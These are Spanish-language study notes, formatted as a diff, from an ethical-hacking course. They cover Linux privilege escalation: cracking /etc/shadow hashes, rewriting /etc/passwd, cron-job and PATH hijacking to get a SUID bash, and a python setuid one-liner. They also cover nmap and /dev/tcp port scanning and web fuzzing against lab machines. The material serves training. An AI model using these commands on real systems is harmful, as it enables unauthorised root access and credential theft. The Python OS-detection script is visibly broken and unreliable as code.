@@ -1,0 +1,974 @@
+Apuntes sobre el curso de introdución al hacking ético de s4vitar. Aclarar que las explotaciones que se muestran, en la gran mayoria, ya no son funcionales de la
+manera que él las explica (ya que són errores de seguridad para ganar acceso a root que ya han sido solucionados, en la versión actual de linux).
+Por lo tanto, estos metodos se deben de tomar como simple práctica y conocimiento básico.
+
+EXLOTACIÓN Y ABUSO DE LOS PRIVILEGIOS:
+-find \-perm -4000 (2>/dev/null) -> Para buscar quien tiene privilegios SUID (los directorios a los que no pueda acceder se redirijen hacia /dev/null).
+-cat /etc/shadow | grep "ENCRYPT_METHOD" -> Para mostrar el metodo de encriptado de las passwords de los usuarios -> Con una wordlist como rockyou.
+-cat /etc/shadow | grep raul > hash -> Cojes la contraseña encriptada del usuario raul.
+-john --wordlist=rockyou.txt hash -> Para romper la contraseña hash podemos utilizar john con el wordlist rockyou.
+-find \-writable (2>/dev/null) | grep "etc" -> Filtramos por los archivos que se puedan escribir como "otros" y ademas ponemos un filtro para el directorio /etc
+que es critica.
+Si podemos escribir en /etc/passwd y cambiamos la X (contraseña hasheada) y ponemos nostros un hash que hemos creado con anterioridad con openssl pssword 
+(tiene que ser del tipo DES(Unix) se puede comprobar con hash-identifier o hashid), después cuando hagamos sudo su y nos pida la contraseña de root podremos
+ganar acceso poniendo poniendo la contraseña sin hashear que hemos sustituido en /etc/passwd. (NO COMPROVADO)
+
+DETECCIÓN DE TAREAS CRON A TRAVES DE UN SCRIPT EN BASH
+-ps -eo command -> lista los comandos que se estan ejecutando en tiempo real -> con esto creamos un script para que nos muestre por pantalla los comandos que se van 
+ejecutando en cada momento (diff entre los viejos y los nuevos), y aplicamos un filtro para ver solo lo que nos interesa (en este caso las tareas cron que se estan
+ejecutando). Seguidamente miraremos si algunas de estas tareas es writable por otros, y si lo es, modificaremos el archivo para que ejecute:
+-chmod 4755 /bin/bash -> de esta manera cuando el sistema ejecute el archivo cron dará privilegios SUID a la bash, de forma que "otros" podran ganar acceso a la shell
+con el comando:
+-bash -p -> donde -p es una flag de seguridad necesaria para hacer uso de los privilegios SUID. (NO FUNCIONAL)
+
+EXLOTACIÓN DE UN PATH HIJACKING FRENTE A UN BINARIO SUID
+Primeramente, programaremos un pequeño programa en c que lo unico que hace es ejecutar un par de llamadas a sistema. En c como medida de segurida nos obliga a
+declarar setuid(0) para que lo podamos ejecutar con los privilegios SUID cuando usamos un usuario no propietario (otros).
+-echo $PATH -> Nos mostrara las diferentes rutas por la que busca los comandos que ejecutamos. Por eso cuando hacemos la llamada a sistema whoami nos devuelve
+lo mismo que si lo hacemos por la ruta aboluta /usr/bin/whoami. Por tanto, que pasará si creamos un archivo llamado whoami en una ruta más prioritaria que
+/usr/bin? Al no ejecutarlo con la ruta absoluta el sistema encontraría antes el whoami que hemos creado.
+-export PATH=.:$PATH -> Este comando se utiliza para modificar la prioridad de las rutas, en este caso se esta poniendo la ruta actual como la más prioritaria
+(.) aunque podemos poner cualquier ruta. Estos cambios son temporales por cada sesión.
+-strings backup (binario) -> Con strings se nos permite mostrar las cadenas de caracteres de un binario para de esta forma poder averiguar que comandos se estan 
+ejecutando y si se esta haciendo desde una ruta absoluta o no.
+Esto mismo se puede utilizar para lanzar una shell como root. Ya que el ejecutable del programa c tiene privilegios SUID, modificaremos $PATH para que la ruta más 
+prioritaria sea /tmp donde tendremos un script que lanza una shell (bash -p). Por lo tanto, cuando se ejecute el programa en c y se haga la llamada a sistema ps 
+utilizando la ruta relativa realmente se estará ejecutando nuestro script de la shell y ganaremos acceso a root. (NO FUNCIONAL)
+
+EXPLOTACIÓN Y ABUSO DE LAS CAPABILITIES EN LINUX
+Hay veces que es un tanto desafiante convertirse en root y no merece la pena. Existe otra alternativa, lo que se conoce como persistencias. Otra cosa que podriamos
+hacer para pasar más desapercibidos es mediante la explotación y el abuso de las capabilities.
+-getcap -r / 2>/dev/null -> Para mostrar las capabilities que hayan definidas a nivel de sistema en la raiz de forma recursiva, 2>/dev/null lo utilizamos para un
+mejor filtraje al eliminar el stderr (ya que habrá rutas a las que no tenga acceso al no ser root).
+-setcap cap_setuid+ep /usr/bin/python3.8 -> Le asignamos a python3.8 la capability del setuid+ep (utilizada más adelante para poder poner el setuid(0)).
+-setcap -r cap_setuid+ep /usr/bin/python3.8 -> Con -r le quitamos la capability
+-python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")' -> -c quiere decir desde una consola interactiva en un 'one liner', se importa la libreria os y
+atraves de un atributo de os que es setuid(0) le indiacamos que queremos operar con el id=0 (root) y seguidamente, atraves de otro atributo de os, indicamos que 
+queremos hacer una llamada al sistema y abrir una bash.
+Hay muchos tipos de capabilities que nos permiten explotar diferentes servicios para ganar acceso a root. En iternet se pueden buscar. Ej GTFOBins. (NO FUNCIONAL)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+PENTESTING: 5 fases -> Reconocimiento inicial | Busqueda de versiones y exploits | Explotación | Obtención de resultados | Documento ejecutivo y técnico (Auditorias)
+
+FASE DE RECONOCIMIENTO INICIAL - ENUMERACIÓN DE PUERTOS CON NMAP
+-ping -c 1 10.0.2.2 -> Envia una trama ICMP a la dirección IP que pongamos (el gateway del router en mi caso). Podemos observar que si el TTL esta cerca de 64, estamos
+ante una maquina linux y, por otro lado, si esta cerca de 128 nos estará responiendo una maquina windows.
+-nmap 10.0.2.2 -p- --open -T5 -v -n -oG allPorts -> La herramienta nmap nos permite escanear los puertos de una máquina objetivo. Con el argumento '-p-' le marcamos
+que queremos escanear los 65535 puertos. El argumento --open lo utilizamos para que nos indique solamente los puertos abiertos. -T sirve para marcar el grado de 
+agresividad (cuanto más alto más agresivo y rapido hará el escaneo). Ponemos -v para el verbose y conforme vaya encontrando puertos nos los vaya mostrando sin esperar
+a la finalización del escaneo completo. El -n para marcar que no queremos hacer resolución DNS ya que es muy costosa en tiempo. Y por último, lo exportamos en formato 
+grepable a un fichero llamado allPorts. 
+
+CREANDO UNA PEQUEÑA UTILIDAD EN BASH PARA EL FILTRADO DE PUERTOS
+La utilidad tendrá la función de mostrar la informació más relevante del fichero allPorts (fichero que contiene los puertos abiertos de una cierta dirección IP). Lo 
+haremos filtrando por expresiones regulares:
+-cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS= "/" | xargs | tr ' ' ',' -> Para filtrar el output del fichero allPorts. Primeramente, hacemos un primer
+filtrage con grep de forma que solo imprima por pantalla los numeros de 1 a 5 digitos que vayan acompañados de un /open. Con este output hacemos un segundo filtraje
+con awk para que muestre el primer argumento, teniendo como delimitador "/" (otra opción seria cut -d '/' -f 1). De esta forma solamente nos mostrará el numero del
+puerto abierto. Utilizaremos xargs para compartarlo todo en una misma linea y tr para efectuar la sustitución de los espacios por comas. Resultado: 22,80,443,445
+-cat allPorts | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u -> Mediante este filtraje con expresiones regulares se nos estarian listando las direcciones
+IP del fichero allPorts (dirección IP víctima). Para que no muestre la dirección IP repetidas veces utilizamos el comando sort -u.
+Para utilizar la utilidad modificaremos el archivo .zshrc en caso de tener una shell zsh (si trabajaramos en bash modificariamos .bashrc), creando una función que
+aplique los filtrajes mencionados al archivo allPorts:
+	
+	function extractPorts(){
+    	echo -e "\n${purpleColour}[*] Extracting information...${endColour}\n"
+    	ip_address=$(cat allPorts | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)
+    	open_ports=$(cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',')
+
+   	echo -e "${redColour}[*] IP Address: ${endColour}${grayColour}$ip_address${endColour}"
+    	echo -e "${redColour}[*] Open Ports: ${endColour}${grayColour}$open_ports${endColour}\n"
+
+    	echo $open_ports | tr -d '\n' | xclip -sel clip
+    	echo -e "${purpleColour}[*] Ports copied to clipboard!${endColour}\n"
+	
+Para el correcto funcionamiento de los colores será necesario añadir al archivo las siguientes lineas:
+
+	greenColour="\e[0;32m\033[1m"
+	endColour="\033[0m\e[0m"
+	redColour="\e[0;31m\033[1m"
+	blueColour="\e[0;34m\033[1m"
+	yellowColour="\e[0;33m\033[1m"
+	purpleColour="\e[0;35m\033[1m"
+	turquoiseColour="\e[0;36m\033[1m"
+	grayColour="\e[0;37m\033[1m"
+
+De esta forma, utilizando el comando extractPorts allPorts se nos mostrará tanto la IP víctima como los puertos abiertos. Además, se nos habrá copiado los puertos
+abiertos en la clipboard (portapapales).
+
+
+
+DETECCIÓN DE VERSIÓN Y SERVICIOS CON NMAP
+Vamos a lanzar una serie de scrips basicos de enumeración con nmap, para tratar de descubrir la versión y el servició que corren los puertos abiertos.
+-nmap -sC -sV -p22,80 10.0.2.2 -oN targeted -> -sC para detectar el servicio (script) que esta corriendo y -sV para la versión. Indicamos para que puertos queremos la
+información de cierta dirección IP y lo exportamos en formato nmap (fichero .txt) a un fichero llamado targeted.
+Si encontramos el puerto 80 abierto (utilizado para las páginas web) podemos utilizar whatweb para ver la información más relevante.
+-whatweb http://10.10.10.188 2>/dev/null -> utilizamos el stderr (2>/dev/null) para la gestión de errores. 
+
+
+TÉCNICAS PARA AGILIZAR NUESTROS ESCANEOS CON NMAP
+En algunas ocasiones con la anterior configuración el escaneo de nmap puede llevar bastante tiempo en completarse. Vamos a proponer otra configuración para tratar de
+solventar este problema. Una posible solución sería:
+-nmap --top-ports 5000 --open -T5 -v -n 10.10.10.11 -> Lo que hacemos aqui es escanear solamente los 5000 puertos más relevantes, por lo tanto, puede ser una buena
+solución pero es posible que nos estemos dejando algun puerto abierto por escanear. Otra solución sería (TCP-SYN scan):
+-nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.11 -> -sS para marcar el tipo de scaneo TCP-SYN, con --min-rate 5000 marcamos que queremos emitir paquetes no
+más lentos que 5000 paquetes/s. En este caso también utilizamos -Pn para marcar que no queremos que aplique host discovery (a través del prtocolo de resolución de
+direcciones -> ARP).
+
+
+CREACIÓN DE HERRAMIENTA EN BASH PARA LA DETECCIÓN DE PUERTOS TCP ABIERTOS
+Para detectar puertos abiertos, de una forma más discreta que con nmap, podríamos crear un script en bash llamado portScan que sea capaz de detectar los puertos
+abiertos mediante el protocolo TCP de forma manual.
+Para ello nos tenemos que aprovechar de un concepto que nos permitirá saber si un puerto de una cierto dirección IP está abierto o no.
+-bash -c "echo ' ' > /dev/tcp/10.0.2.2/port" -> lo que estamos haciendo es mandar un espacio vacio mediante TCP a la IP y puerto indicado. Si lo enviamos a un puerto
+que esta abierto veremos que no hace nada, en cambio cuando lo enviamos a un puerto cerrado nos aparece un mensaje de error. Para comprobarlo:
+-echo $? -> Si nos muestra un 0 quiere decir que el comando anterior ha tenido exito (el puerto está abierto) y si nos muestra un 1 quiere decir que no lo ha tenido
+(el puerto está cerrado).
+Aprovechando esto podemos crear el siguiente scrip en bash para detectar puertos abiertos mediante TCP:
+
+	#!/bin/bash
+
+	# ./portScan.sh <ip-address>
+
+	#Colours
+	greenColour="\e[0;32m\033[1m"
+	endColour="\033[0m\e[0m"
+	redColour="\e[0;31m\033[1m"
+
+	if [ $1 ]; then
+    	    ip_address=$1
+    	    for port in $(seq 1 65535); do
+                timeout 1 bash -c "echo ' ' > /dev/tcp/$ip_address/$port" && echo -e "[*] Port ${redColour}$port${endColour} - ${greenColour}OPEN${endColour}" &
+    	    done; wait
+	else
+    	    echo -e "\n[*] Use: .portScan.sh <ip_address>\n"
+            exit 1
+	fi
+
+Combinamos el comando visto anteriormente con un && para que nos printe el puerto abierto. El & final marca que uilice varios hilos de forma que todas las peticiones
+salgan a la vez y no se tengan que esperar entre ellas.
+
+CREACIÓN DE HERRAMIENTA EN BASH PARA EL DESCUBRIMIENTO DE EQUIPOS EN LA RED
+Como en el ejemplo anterior, podemos utilizar nmap para el reconocimiento de maquinas en un segmento de red, pero és muy ruidoso. Por lo tanto, merece la pena que
+tengamos nuestro propio script. De forma similar al ejemplo anterior, nos aprovecharemos de un concepto en concreto. En este caso es que si enviamos un ping a una
+dirección IP, este nos contesta y el comando echo $? nos mostrará un 0. De forma contraria, si no nos contesta nos devolverá un 1. Podemos crear el siguiente script:
+
+	#!/bin/bash
+
+	#Colours
+	greenColour="\e[0;32m\033[1m"
+	endColour="\033[0m\e[0m"
+	purpleColour="\e[0;35m\033[1m"
+	redColour="\e[0;31m\033[1m"
+
+	for i in $(seq 2 254); do
+    	    timeout 1 bash -c "ping -c 1 10.0.2.$i > /dev/null 2>&1" && echo -e "${redColour}[*]${endColour} ${purpleColour}Host 10.0.2.$i${endColour} - ${greenColour}ACTIVE${endColour}" &
+	done; wait
+
+- > /dev/null 2>&1 -> Lo utilizamos para que no nos muestre el output del comando, de forma que solo veamos el mensaje. El ejemplo esta hecho con la dirección
+10.0.2/24 pero, obviamente podemos modificarla segun necesitemos e incluso poner un doble bucle para buscar en una red /16, por ejemplo.
+
+RECONOCIMIENTO A TRAVES DE LOS SCRIPTS QUE INCORPORA NMAP POR CATEGORIA
+Anteriormente hemos hablado de utilizar scripts básicos de enumeración con el parametro -sC, pero ¿dónde se encuentran esos scripts y que categoria tienen?
+Lo podemos hacer con los siguientes comandos:
+-updatedb -> Para sincronizar todos los archivos existentes a nivel de sistema en una base de datos.
+-locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u -> Una vez actualizado, con locate me va a mostrar la ruta absoluta de un archivo. En este caso, nos intersa los archivos con extension .nse que son los
+scripts de nmap. Paralelamente, con xargs quiero que para cada script me haga un grep de su categoria. Después, si lo que queremos es que nos muestre todas las
+categorias existentes podemos utilizar un grep que nos filtre por expresiones regulares (le decimos que muestre toda la información que haya entre comillas, que es el
+nombre de la categoria). Por último, sort -u para ordenar de forma unica.
+Hay un total de 14 categorias y sabiendo sus nombres podemos utilizarlos para lanzar una serie de scripts de una categoria en concreto. Por ejemplo:
+-nmap -p445 10.10.10.40 --script "vuln and safe" -oN smbScan -> Para el puerto 445 (samba) estamos lanzando una serie de scripts de la categoria vuln y safe y
+exportando a un archivo llamado smbScan en formato nmap. Como vemos, las categorias se pueden fusionar con un and o un or.
+
+USO DE SCRIPTS ESPECIFICOS DE NMAP Y USO DE ANALIZADORES DE TRAFICO
+Nmap a parte de la enumeración de servicios también te permite, entre otras cosas, listar directorios que puedan exister en el servidor web (incluido archivos).
+¿Cómo hacemos esto? Mediante scripts:
+-nmap -p80 10.10.10.188 --script http-enum -oN webScan -> Utilizamos el script http-enum (fuzzing). Básicamente lo que trata de hacer este script es, mediante un
+diccionario interno que tiene nmap, mandar peticiones al servidor web de directorios o archivos que puedan existir (método GET). Gracias al codigo que nos retorne el
+servidor a esta petición (403 ERROR o 200 OK) sabremos si el directorio o archivo, en la mayoria de casos, existe en el servidor web.
+Una forma de poder saber que esta pasando por detrás cuando ejecutamos este script es utilizando tcpdump:
+-tcpdump -i tun0 -w Captura.cap -v  -> Escucha el trafico que pasa por la interfaz indicada y exporta el output en el fichero Captura.cap
+Para interpretar esta captura podemos utilizar tshark (wireshark pero sin interficie grafica) y aplicando filtros podemos averiguar que diccionario interno esta 
+utilizando nmap:
+-tshark -r Captura.cap -Y "http" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r | grep "GET" | awk '{print $2}' | sort -u -> Se estan aplicando varios filtros,
+primeramente, estamos filtrando por peticiones web http. Con el parametro -Tfields -e aplicamos otro filtro del campo que nos interese (los diferentes campos los 
+podemos saber haciendo una pequeña busqueda antes con el parametro -Tjson). Como este campo esta codificado en hexadecimal utilizamos xxd con los parametros -ps -r
+para hacer el 'reverse' de la codificación y que de esta forma sea legible. Una vez decodificado aplicamos otro filtro, ya que solo nos intersa las peticiones GET y 
+utilizamos awk para que nos muestre solamente el segundo parametro, sort -u para ordenar de forma unica. 
+
+USO DE WIRESHARK PARA EL ANALISIS DE TRÁFICO EN LA RED
+Básicamente, wireshark es como tshark pero con interfaz gráfica, lo que lo hace un poco más fácil de manejar a pesar de sus limitaciones. Para poder abrir wireshark
+desde terminal como un programa totalmente a parte tenemos que ejecutar lo siguientes comandos:
+-wireshark Captura.cap > /dev/null 2>&1 & 
+-disown
+De esta forma lo que hacemos es redirigir el stderr output al dev/null y con & lo hacemos un proceso aislado a la terminal. Finalmente, para que el proceso no muera
+al cerrar la terminal (ya que wireshark es el proceso hijo) ejecutamos disown.
+
+
+CREACIÓN DE SCRIPT EN PYTHON3 PARA IDENTIFICAR EL SISTEMA OPERATIVO
+Crearemos una utilidad en python3 que, donde dando la dirección IP como parámetro, nos muestre el sistema operativo de la víctima. Esto se puede hacer mediante el
+campo TTL (64 en Linux y 128 en Windows) en el momento que lanzamos un ping. Hay que tener conocimientos básicos de python para realizar este tipo de scripts, por lo
+que es recomendable aprender los conceptos básicos del lenguaje.
+
+	#!/usr/bin/python3
+	import re, sys, subprocess
+
+	# usage: $ python3 whichSystem.py <ip>
+
+	if len(sys.argv) != 2:
+    	   print("\n[!] Usage: python3 " + sys.argv[0] + " <direccion-ip>\n")
+    	   sys.exit(1)
+
+	def is_valid_ip(ip_address):
+            # Utilizamos una expresión regular para verificar el formato de la dirección IP
+            ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
+    	    return re.match(ip_pattern, ip_address) is not None
+
+
+	def get_ttl(ip_address):
+    	    if not is_valid_ip(ip_address):
+            print("\n[!] Dirección IP no válida. Por favor, introduzca una dirección IP válida.\n")
+            sys.exit(1)
+
+    	    proc = subprocess.Popen(["/usr/bin/ping -c 1 %s" % ip_address, ""], stdout=subprocess.PIPE, shell=True)
+            (out, err) = proc.communicate()
+    	    out = out.split()
+    	    out = out[12].decode('utf-8')
+    	    ttl_value = re.findall(r"\d{1,3}", out)[0]
+
+	    return ttl_value
+
+
+	    def get_os(ttl):
+       	    ttl = int(ttl)
+            if ttl >= 0 and ttl <= 64:
+                return "Linux"
+    	    elif ttl >= 65 and ttl <= 128:
+                return "Windows"
+    	    elif ttl >= 129 and ttl <=254:
+        	return "Solaris/AIX"
+    	    else:
+        	return "Not Found"
+
+	if _name_ == '__main__':
+            ip_address = sys.argv[1]
+            ttl = get_ttl(ip_address)
+    	    os_name = get_os(ttl)
+    	    print("\n[*] %s (ttl -> %s): %s\n" % (ip_address, ttl, os_name))
+
+A rasgos generales, vemos como lanzamos un ping a la dirección IP pasada por parámetro y después aplicamos una serie de filtros para quedarlos solamente con el valor
+del TTL. Con este valor podemos determinar que SO tiene la máquina víctima.
+Una vez que tenemos nuestro script, le damos permisos de ejecución y lo podemos poner en alguna ruta del PATH para poderlo mencionar desde una ruta relativa. Por
+ejemplo lo podemos mover a /usr/bin.
+
+
+USO DE WFUZZ PARA HACER FUZZING
+Fuzzing -> Encontrar rutas dentro de un servidor web. Anteriormente, ya hemos utilizado un script de nmap para hacer fuzzing (http-enum), pero no es una herramienta 
+especialidada en el fuzzing. Si queremos profundizar un poco más tendremos que utilizar otras herramientas, como Wfuzz.
+-wfuzz -c -L -t 400 --hc=404 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt https://@IP/FUZZ -> Parametros: -c lo ponemos para que nos muestre el
+output en formato colorizado, -L para que haga un follow-redirect, de esta forma nos ahorramos los codigos 301 y nos muestra el estado final de la petición
+(código 200), con -t especificamos los threads (cuantas peticiones se hacem simultaniamente), --hc=404 para que en el output no nos muestre las peticiones que vayan
+con el codigo de error 404 (hc = hide code), -w para especificar el diccionario que vamos a utilizar, el cual contiene muchhisimos nombres de directorios que se van a
+probar por fuerza bruta.
+El fuzzig se hace contra la dirección IP indicada y con /FUZZ indicamos donde queremos que se sustituyan las palabras del diccionario. Podemos jugar con varios filtros
+al mismo tiempo. Ej. --sc=200 --hl=170 (sc = show code). Hay muchos más filtros (por lineas, palabras, carácteres...) que se pueden consultar con el manual.
+
+
+FUZZING DE EXTENSIONES DE ARCHIVO CON WFUZZ (USO DE MULTIPLES PAYLOADS)
+Hasta el momento, cuando hacemos fuzzing contra una página web probamos con un montón de nombres de directorios y archivos pero no sabemos que extensión tiene, por lo
+que tampoco sabemos con que estamos tratando. Para hacer una comprobación de que tipo de archivos tiene la víctima hacemos uso de otro diccionario:
+-wfuzz -c -L -t 400 --hc=404 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt -w extensiones.txt https://@IP/FUZZ.FU2ZZ -> Donde el extensiones.txt es
+un archivo creado por nosotros que contiene las extensiones que queremos combrobar.
+Por lo tanto, con el /FUZZ.FU2ZZ lo que hacemos es que para cada palabra del primer diccionario buscamos si tiene algunas de las extensiones del segundo diccionario.
+Wfuzz cuenta con su propio User-Agent, esto es una cabecera retocable con el parámetro -H "User-Agent: Google Chrome", y de esta forma ya estaría trabajando bajo ese
+User-Agent (incluso se pueden utilizar cookies de sesión para aplicar fuzzing a recursos internos de un panel, ya estando autenticados).
+
+
+USO DE DIRBUSTER PARA HACER FUZZING
+Dirbuster tiene el mismo prósito que Wfuzz pero, igual que pasaba con Wireshark, esta tiene interficie gráfica. Para abrir Dirbuster lo haremos del mismo modo que
+haciamos con Wireshark:
+-dirbuster > /dev/null 2>&1 & 
+-disown
+A modo de recordatorio, lo que hacemos es redirigir el stderr output al dev/null y con & lo hacemos un proceso aislado a la terminal. Finalmente, para que el proceso
+no muera al cerrar la terminal (ya que dirbuster es el proceso hijo) ejecutamos disown.
+Si haciendo fuzzing encontramos, por ejemplo, un directorio con varios archivos lo que podemos hacer es:
+-wget -r http://IP/<nombre-directorio> -> Para descargar todo los archivos que haya en el directorio de forma recursiva. Una vez descargado todos los archivos
+podriamos hacer busquedas recursivas por palabras clave para encontrar información relevante. Ej:
+-grep -r -E -i "pass|user|key|database" | less -S -> Parametros: -r de forma recursiva, -E para diversos campos, -i sin atender a mayusculas o minusculas, less -S para
+que no haya saltos de linea y de esta forma sea mas legible el output.
+
+
+USO DE DIRB PARA HACER FUZZING
+Dirb es una herramienta para hacer fuzzing un poco más sencilla que las que ya hemos visto. No tiene hilos de ejecución, por lo que puede ir un poco lenta. Si no
+especificamos un diccionario utilizará uno interno (el qual se muestra cuando se ejecuta la herramienta), pero este és muy pequeño por lo que se recomienda utilidar
+el de dirbuster, por ejemplo:
+-dirb https://IP -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt
+
+
+USO DE GOBUSTER PARA HACER FUZZING
+Gobuster es una herramienta hecha en el lenguaje de programación 'Go' y esta trabaja muy bien con sockets y conexiones, por lo que es una herramienta bastante potente.
+Con el comando gobuster se puede ver un poco de información de los parametros que admite la herramienta, ya que en este caso no tenemos manual.
+-gobuster dir -t 100 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt --url https://IP -> Parametros: tenemos que poner 'dir' para entrar en un modo de
+furza bruta por directorio o archivo, -t para indicar los hilos de ejecución, -w para indicar el diccionario y --url para indicarle la dirección IP.
+Un punto positivo de esta herramienta es que nos muestra la barra de progreso, lo que nos da un tiempo estimado de ejecución.
+
+
+USO DE DIRSEARCH PARA HACER FUZZING
+Dirsearch no es una herramienta predeterminada, por lo que hay que descargarla desde github. Esta herramienta nos permite jugar con muchos parametros, lo que la hace
+muy útil y cómoda.
+-./dirsearch.py -u https://IP -E -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt -> Parámetros: -u para indicar la url, -w para indicar el diccionario, 
+con -E hacemos que utilice un diccionario de extensiones por defecto.
+Como vimos en Wfuzz, esta también nos permite jugar con las cookies para aplicar fuzzing a recursos internos estando ya autenticados, cambiar los headers o aplicar
+filtros. Es una herramienta que nos da mucha versatilidad.
+Wfuzz y dirsearch son las herramientas más completas para hacer fuzzing.
+
+
+TÉCNICAS DE ENUMERACIÓN BAJO UN SERVIDOR WEB
+Segunel gestor de contenido (Wordpress, drupal...) lo más probable es que tengamos que utilizar herramientas específicas que te escanean este gestor de contenido en 
+concreto.
+Un ejemplo, en una página web con un gestor de contenido Wordpress, hacemos Ctrl+u para ver el código fuente. Si vemos que las imagenes hacen elusion a una misma
+dirección que es la que tiene el contenido. En estos casos podemos pensar en un concepto llamado Virtual Host Routing, que te permite contar con multiples servidores
+virtuales web (en este caso) desde una misma máquina, es la capacidad en base al DNS de alojar multiples servidores web. En función del dominio que especifiquemos nos
+carga una web distinta.
+Ante esta situación lo que podemos hacer es modificar el archivo /etc/hosts:
+
+	127.0.0.1   localhost
+	127.0.1.1   parrot
+
+	IP   	   <dominio>
+
+De esta forma, cualquier consulta que se realice al domio indicado se resuelva a la IP indicada. Si podemos acceder a la dirección que tiene el contenido de las
+imagenes es que se estaba haciendo uso del Virtual Host Ruting y lo hemos explotado.
+Ahora nos gustaría saber si el servidor web contiene un WAF (Web Application Firewall). Este es un tipo de firewall que filtra o bloquea el tráfico HTTP hacia y desde
+la aplicación web. Podemos utilizar herramientas como Wafw00f <ip> para saber si la web tiene un WAF.
+Algo que tenemos que tener claro es que para cada gestor de contenido existen diferentes herramientas para efectuar un reconocimento. Es nuestro trabajo buscar esas
+herramientas y documentarnos para aprender a utlizarlas. En este caso, estamos frente a un Wordpress, por lo que podriamos utilizar Wpscan:
+-wpscan --url "http://IP" -e vp,u -> Parámetros: --url para indicar el dominio de la página, ya sea mediante la IP o el nombre, -e vp,u para enumerar plugins vulnerables
+(vulnerable plugins) y usuarios existentes en el gestor de contenido.
+La herramienta te efectua un reconocimento sobre el gestor de contenido y trata de dictarte por consola si hay vulnerabiliades potenciales. Aunque el gestor de
+contenido este actualizado a su última versión, si utiliza un plugin desactualizado puede ser vulnerable. Hay muchas herramientas de reconocimiento que podemos
+econtrar via internet que también hacen muy buen trabajo, algunas són más generales, como nikto, openVAS o nessus, o más epecializadas en un gestor de contenido, como
+ya hemos visto. Así que hay que tenerlas en cuenta para según que situaciones. Por ejemplo, WPSeku es otra herramienta de scaneo para wordpress, disponible vía github
+y su funcionamiento sería el siguiente:
+-python3 wpseku.py -u http://<dominio> -> Escaneo básico, solamente especificamos la url.
+
+
+HACKEANDO NUESTRA PRIMERA MAQUINA (RFI)
+Hasta este punto ya hemos visto la metodologia para enumerar puertos, servicios que corren bajo estos puertos, versiones... Con esto, vamos a ver como un atacante es
+capaz de hackearla y ganar acceso al sistema. En este caso, nos vamos a enfrentar a una máquina linux con un servidor web donde tiene multiples rutas, con distintos
+gestores de contenido, entre ellos Wordpress que hemos visto anteriormente. Vamos a suponer que la IP víctima es la 10.10.10.88, con la que trabajaremos.
+Vamos a ver paso a paso lo que tendríamos que hacer. Antes de la fase de reconocimiento hacemos unos preparativos:
+-ping -c 1 10.10.10.88 -> Para ver si la máquina esta activa y nos responde. Cabe la posibilidad que tenga desactivado el ping pero si este activa, en este caso
+tendríamos que utilizar otra trama que no sea un ICMP, por ejemplo TCP o UDP.
+-whichSystem 10.10.10.88 -> Ejecutamos script (hecho anteriormente) que nos indica el sistema operativo de la víctima. En este caso es un Linux.
+-mkdir TartaSauce -> Creamos directorio con el nombre de la máquina víctima. En este caso, TartaSauce.
+-mkt -> Función, hecha por nostros (modificando el zshrc), que nos crea los directorios de trabajo. Content, exploits, nmap, scripts y tmp.
+Ahora si a partir de aqui empezamos la FASE DE RECONOCIMIENTO:
+-nmap -p- --open - T5 -v -n 10.10.10.88 -oG allPorts -> Hacemos un reconocimiento de todos los puertos con nmap y lo exportamos en formato grepable al fichero allPorts.
+-extratPorts allPorts -> Función, hecha por nostros (modificando el zshrc), que nos extrae los puertos abiertos que nos indica el fichero allPorts y nos los copia en 
+la clipboard. En este caso, unicamente el puerto 80 esta abierto.
+-whatweb https://10.10.10.88 2>/dev/null -> Como el perto 80 esta abierto, miramos la información más relevante del servidor web.
+-nmap -sC -sV -p80 10.10.10.88 -oN targeted -> Para el puerto 80, lanzamos unos scripts básicos de enumeración y tratamos de averiguar la versión del servidor web. Lo 
+exportamos en formato nmap al fichero targeted. En este caso, uno de los scripts que nos esta lanzando es el http-robots que nos reporta que hay ciertas rutas dentro 
+del robot que son visibles. Por tanto, si buscamos 10.10.10.88/robots.txt se nos van a listar una serie de directorios.
+-nmap --script https-enum -p80 10.10.10.88 -oN webScan -> Antes de aplicar fuzzing con herramientas especializadas, lanzamos el script http-enum y lo exportamos, en 
+formato nmap, al fichero webScan.
+-wfuzz -c -L -t 400 --hc=404 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.88/webservices/FUZZ -> Utilizamos Wfuzz para hacer un
+ataque por fuerza bruta haciendo uso de diccionarios pero, no en la dirección IP sino en el directorio webservices que hemos encontrado anteriormente en el robots.txt.
+Vemos que nos encuentra el directorio wp, que no estaba en robots.txt. Cuando accedemos https://10.10.10.88/webservices/wc veremos una pagina relacionada con wordpress,
+por lo que intentamos entrar en el login default (https://10.10.10.88/webservices/wp/wp-login.php) y vemos que nos deja. En este punto debemos pensar directamente en
+una herramienta de escaneo del gestor de contenido, en este caso Wpscan.
+-wpscan --url "https://10.10.10.88/webservices/wp/" -e vp,u -> Hacemos un escaneo general del gestor de contenido para ennumerar plugins vulnerables y usuarios.
+En este caso, no nos muestra nada relevante haciendolo de esta forma. Vamos a intentar hacerlo de forma manual.
+Sabemos que los plugins de wordpress se suelen almacenar en una ruta llamada wp-content/, por lo que si nos vamos a https://10.10.10.88/webservices/wp/wp-content
+veremos que no muestra nada, pero existe, ya que si no existiera nos pondría un Not Found. Entonces lo que podemos hacer es hacer uso de un diccionario de plugins para
+wordpress. Para ello vamos a utilizar una herramienta llamda SecLists que son un repositorio centralizado de diccionarios utilizados en el ambito del pentesting.
+En concreto, nos interesa uno llamado wp-plugins.fuzz.txt que contiene muchos nombres de scripts y aplicando fuzzing podremos averiguar si existen en la página víctima
+o no (dependiendo de si nos devuelve un 200 OK).
